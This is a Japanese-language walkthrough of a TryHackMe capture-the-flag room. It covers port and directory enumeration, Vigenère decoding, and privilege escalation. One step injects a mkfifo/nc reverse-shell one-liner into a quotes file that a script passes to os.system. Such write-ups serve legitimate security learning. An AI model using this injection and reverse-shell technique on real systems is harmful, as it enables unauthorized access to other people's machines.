# Break Out The Cage CTF

https://tryhackme.com/room/breakoutthecage1

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.28.0
sudo nmap -sS -p- $TARGET

PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

sudo nmap -sV -p80 $TARGET

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
MAC Address: 02:E6:E9:BF:B6:4B (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

FTP, SSH, HTTP

### FTP

anonymousで1ファイル入手。

```
$ cat dad_tasks                                                                             
UWFwdyBFZWtjbCAtIFB2ciBSTUtQLi4uWFpXIFZXVVIuLi4gVFRJIFhFRi4uLiBMQUEgWlJHUVJP..................................................................
```

Base64
```
Qapw Eekcl - Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!
Sfw. Kajnmb xsi owuowge
Faz. Tml fkfr qgseik ag oqeibx
Eljwx. Xil bqi aiklbywqe
Rsfv. Zwel vvm imel sumebt lqwdsfk
Yejr. Tqenl Vsw svnt "urqsjetpwbn einyjamu" wf.

Iz glww A ykftef.... Qj..................................
```

ROT系かと思ったが、復号できない。  
vigenere暗号ではないかと推測。だとしたらキーが必要。

### gobuster

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt
gobuster dir -x=txt,php -u http://$TARGET -w ./dirlist.txt -t 30

/auditions            (Status: 301) [Size: 312] [--> http://10.10.28.0/auditions/]
/contracts            (Status: 301) [Size: 312] [--> http://10.10.28.0/contracts/]
/.htaccess.txt        (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htaccess.php        (Status: 403) [Size: 275]
/html                 (Status: 301) [Size: 307] [--> http://10.10.28.0/html/]
/.htpasswd            (Status: 403) [Size: 275]
/.htpasswd.txt        (Status: 403) [Size: 275]
/.htpasswd.php        (Status: 403) [Size: 275]
/images               (Status: 301) [Size: 309] [--> http://10.10.28.0/images/]
/scripts              (Status: 301) [Size: 310] [--> http://10.10.28.0/scripts/]
/server-status        (Status: 403) [Size: 275]
```

- /auditions には must_practice_corrupt_file.mp3
- /contracts には FolderNotInUseファイル（０バイト）
- /scripts には台本みたいなテキストファイルが5ファイル

### mp3

mp3を Sonic Visualiser で開いてスペクトログラムを見ると文字列が出てきた。  
とても読みにくいが、

```
.........iwo
```

・・・と書いているように見えた。

これをキーとして、先ほどのBase64文字列を vigenere復号してみる。

https://www.dcode.fr/vigenere-cipher

```
Dads Taskd - The RAGE...THE NAGE... THE MAN... TSE LEGEND!!!!
One. Cevamp the wemsite
Two. Put xore quotes iy script
Threp. Buy bee pesttcide
Four. Hewp him with aceing lessons
Qive. Teach Dao what "informltion securiey" is.

In case I qorget.... My........................................
```

当たり！

しかし、ところどころアルファベットが不正になっているが、規則性が分からない。  
例えば、Threp は Three だが、全ての p を単純に e に変えたりはできない。

キーが少し間違っているかもしれないと考えた。

```
.........two
```

とするときれいに復号できた。

```
Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
One. Revamp the website
Two. Put more quotes in script
Three. Buy bee pesticide
Four. Help him with acting lessons
Five. Teach Dad what "information security" is.

In case I forget.... ひみつ
```

ホームページに「息子のWeston」という記載があり、上記の暗号文は息子が書いたという関係なので、ユーザー名はWestonということになる。  
質問文に「Westonのパスワードは何か？」と書かれていたので名前が分かったが、それがなかったら気づかなかったと思う。  

## 権限昇格１

```shell
weston@national-treasure:~$ ls -al /home
total 16
drwxr-xr-x  4 root   root   4096 May 26  2020 .
drwxr-xr-x 24 root   root   4096 May 26  2020 ..
drwx------  7 cage   cage   4096 May 26  2020 cage
drwxr-xr-x  4 weston weston 4096 May 26  2020 weston
```

cageに昇格する必要がある。

```shell
weston@national-treasure:~$ find / -user cage -type f 2>/dev/null
/opt/.dads_scripts/spread_the_quotes.py
/opt/.dads_scripts/.files/.quotes
weston@national-treasure:~$ ls -al /opt/.dads_scripts/spread_the_quotes.py
-rwxr--r-- 1 cage cage 255 May 26  2020 /opt/.dads_scripts/spread_the_quotes.py
weston@national-treasure:~$ ls -al /opt/.dads_scripts/.files/.quotes
-rwxrw---- 1 cage cage 4204 May 25  2020 /opt/.dads_scripts/.files/.quotes
```

```python
cat /opt/.dads_scripts/spread_the_quotes.py
#!/usr/bin/env python

#Copyright Weston 2k20 (Dad couldnt write this with all the time in the world!)
import os
import random

lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
quote = random.choice(lines)
os.system("wall " + quote)
```

どこからか一定時間ごとに実行されている。

```shell
weston@national-treasure:~$ id
uid=1001(weston) gid=1001(weston) groups=1001(weston),1000(cage)
```

wetsonはcageグループに入っているので、/opt/.dads_scripts/.files/.quotes は編集可能。

リバースシェルを挿入。

```shell
echo '; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.2.22.182 6666 >/tmp/f' > /opt/.dads_scripts/.files/.quotes
```

```shell
$ nc -nvlp 6666
listening on [any] 6666 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.28.0] 56160
sh: 0: can't access tty; job control turned off
$ id
uid=1000(cage) gid=1000(cage) groups=1000(cage),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd)
```

cageに昇格成功。

```shell
$ ls -al
total 56
drwx------ 7 cage cage 4096 May 26  2020 .
drwxr-xr-x 4 root root 4096 May 26  2020 ..
lrwxrwxrwx 1 cage cage    9 May 26  2020 .bash_history -> /dev/null
-rw-r--r-- 1 cage cage  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 cage cage 3771 Apr  4  2018 .bashrc
drwx------ 2 cage cage 4096 May 25  2020 .cache
drwxrwxr-x 2 cage cage 4096 May 25  2020 email_backup
drwx------ 3 cage cage 4096 May 25  2020 .gnupg
drwxrwxr-x 3 cage cage 4096 May 25  2020 .local
-rw-r--r-- 1 cage cage  807 Apr  4  2018 .profile
-rw-rw-r-- 1 cage cage   66 May 25  2020 .selected_editor
drwx------ 2 cage cage 4096 May 26  2020 .ssh
-rw-r--r-- 1 cage cage    0 May 25  2020 .sudo_as_admin_successful
-rw-rw-r-- 1 cage cage  230 May 26  2020 Super_Duper_Checklist
-rw------- 1 cage cage 6761 May 26  2020 .viminfo

$ cat ./Super_Duper_Checklist
1 - Increase acting lesson budget by at least 30%
2 - Get Weston to stop wearing eye-liner
3 - Get a new pet octopus
4 - Try and keep current wife
5 - Figure out why Weston has this etched into his desk: THM{M.............}
```

ユーザーフラグゲット。

## 権限昇格２

```shell
cage@national-treasure:~$ cat ./email_backup/email_1
From - SeanArcher@BigManAgents.com
To - Cage@nationaltreasure.com

Hey Cage!

There's rumours of a Face/Off sequel, Face/Off 2 - Face On. It's supposedly only in the
planning stages at the moment. I've put a good word in for you, if you're lucky we 
might be able to get you a part of an angry shop keeping or something? Would you be up
for that, the money would be good and it'd look good on your acting CV.

Regards

Sean Archer
```

```shell
cage@national-treasure:~$ cat ./email_backup/email_2
From - Cage@nationaltreasure.com
To - SeanArcher@BigManAgents.com

Dear Sean

We've had this discussion before Sean, I want bigger roles, I'm meant for greater things.
Why aren't you finding roles like Batman, The Little Mermaid(I'd make a great Sebastian!),
the new Home Alone film and why oh why Sean, tell me why Sean. Why did I not get a role in the
new fan made Star Wars films?! There was 3 of them! 3 Sean! I mean yes they were terrible films.
I could of made them great... great Sean.... I think you're missing my true potential.

On a much lighter note thank you for helping me set up my home server, Weston helped too, but
not overally greatly. I gave him some smaller jobs. Whats your username on here? Root?

Yours

Cage
```

```shell
cage@national-treasure:~$ cat ./email_backup/email_3
From - Cage@nationaltreasure.com
To - Weston@nationaltreasure.com

Hey Son

Buddy, Sean left a note on his desk with some really strange writing on it. I quickly wrote
down what it said. Could you look into it please? I think it could be something to do with his
account on here. I want to know what he's hiding from me... I might need a new agent. Pretty
sure he's out to get me. The note said:

ひみつ

The guy also seems obsessed with my face lately. He came him wearing a mask of my face...
was rather odd. Imagine wearing his ugly face.... I wouldnt be able to FACE that!! 
hahahahahahahahahahahahahahahaahah get it Weston! FACE THAT!!!! hahahahahahahhaha
ahahahhahaha. Ahhh Face it... he's just odd. 

Regards

The Legend - Cage
```

mask, face, odd あたりがヒントか？

奇数番目、偶数番目の文字だけ抜き出してパスワードとして試したが失敗。

キーを「FACE」としてvigenere復号したら root パスワードになった。

```shell
root@national-treasure:~/email_backup# pwd
/root/email_backup
root@national-treasure:~/email_backup# ls -al
total 16
drwxr-xr-x 2 root root 4096 May 25  2020 .
drwx------ 8 root root 4096 May 26  2020 ..
-rw-r--r-- 1 root root  318 May 25  2020 email_1
-rw-r--r-- 1 root root  414 May 25  2020 email_2
root@national-treasure:~/email_backup# cat ./email_1
From - SeanArcher@BigManAgents.com
To - master@ActorsGuild.com

Good Evening Master

My control over Cage is becoming stronger, I've been casting him into worse and worse roles.
Eventually the whole world will see who Cage really is! Our masterplan is coming together
master, I'm in your debt.

Thank you

Sean Archer
root@national-treasure:~/email_backup# cat ./email_2
From - master@ActorsGuild.com
To - SeanArcher@BigManAgents.com

Dear Sean

I'm very pleased to here that Sean, you are a good disciple. Your power over him has become
strong... so strong that I feel the power to promote you from disciple to crony. I hope you
don't abuse your new found strength. To ascend yourself to this level please use this code:

THM{........................}

Thank you

Sean Archer
```

ルートフラグゲット

## 振り返り

- あまり勉強にはならないが、パズルとしては楽しめた。
